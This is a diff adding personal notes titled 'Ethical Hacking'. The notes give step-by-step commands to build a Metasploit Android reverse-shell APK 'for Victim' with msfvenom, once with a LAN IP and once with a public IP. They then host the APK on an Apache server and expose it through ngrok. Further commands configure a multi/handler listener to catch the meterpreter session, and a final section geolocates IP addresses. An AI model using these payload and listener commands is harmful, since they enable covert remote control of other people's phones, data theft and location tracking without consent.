@@ -1,0 +1,99 @@
+Ethical Hacking Free Videos
+--------------------------------
+1) https://www.loiliangyang.com/
+2) https://www.youtube.com/channel/UC1szFCBUWXY3ESff8dJjjzw
+
+##########################END################################
+
+Installing Metasploit on Linux / macOS
+---------------------------------------
+https://www.metasploit.com/
+
+###########################END###############################
+
+install apache2 webserver 
+--------------------------
+sudo apt install apache2 
+systemctl status apache2
+
+Access apache localhost by default http://localhost:80
+you can change port from  /etc/apache2/ports.conf by default listen port is 80
+apache2 file location for static pages where all static files where located = /var/www/html/
+
+eg: 
+
+ll /var/www/html/
+-rw-r--r-- 1 root root 11K Jul  6 16:54 index.html
+-rw-r--r-- 1 root root 10K Jul  6 19:59 publicip-test.apk
+
+##############################END#############################
+
+create Payload APK for Victim 
+------------------------------ 
+1) Static IP
+-------------
+https://itsfoss.com/static-ip-ubuntu/
+
+2) Static IP for LAN Access (if two devices connected on same router)
+---------------------------------------------------------------------
+i) static ip = 192.168.43.17
+   eg: https://itsfoss.com/static-ip-ubuntu/
+
+ii) msfvenom -p  android/meterpreter/reverse_tcp LHOST=192.168.43.17 LPORT=4444 R > test.apk
+
+####################################END#######################################################
+
+Remote Access for WAN(Wide Area Network) or Internet
+-----------------------------------------------------
+Puplic IP(157.50.138.103)
+------------------------- 
+1) https://www.noip.com (get free domain)
+
+2) sudo msfvenom -p  android/meterpreter/reverse_tcp LHOST=157.50.138.103 LPORT=4444 R > /var/www/html/publicip-test.apk
+
+eg. public ip - 157.50.138.103
+
+#########################################END###############################################
+
+eg. https://www.shellvoide.com/hacks/how-to-hack-an-android-smartphone-with-metasploit-over-wan-internet/
+
+1) type in terminal  > msfconsole (or) msfconsole -q
+2) search type:exploit platform:android
+3) use exploit/multi/handler
+4) show payloads
+5) set PAYLOAD android/meterpreter/reverse_tcp
+6) info
+7) ip route
+8) set LHOST 192.168.43.17 # static ip
+9) set LPORT 444           # Port for establishing connections
+10) show options
+11) exploit
+12) meterpreter > help
+
+###############################END#####################################
+
+network statistics = netstat -tunlp
+ip address   = ifconfig 
+wifi address = iwconfig
+
+#####################END#################
+
+ngrok
+-----
+Expose a local web server to the internet
+
+ngrok allows you to expose a web server running on your local machine to the internet. Just tell ngrok what port your web server is listening on.
+
+If you don't know what port your web server is listening on, it's probably port 80, the default for HTTP. 
+
+./ngrok http 80
+
+###############################END#####################################
+
+IP Address and Domain Name Geolocation Lookup Tool
+---------------------------------------------------
+https://ipgeolocation.io  eg: IPv6 = 2409:4072:98c:6a8a:23a6:3d80:c4a7:5f87 (or) IPv4 = 157.50.158.45
+
+https://www.google.co.in/maps  eg: lat, long = 19.12540, 72.99920
+
+###############################END#####################################
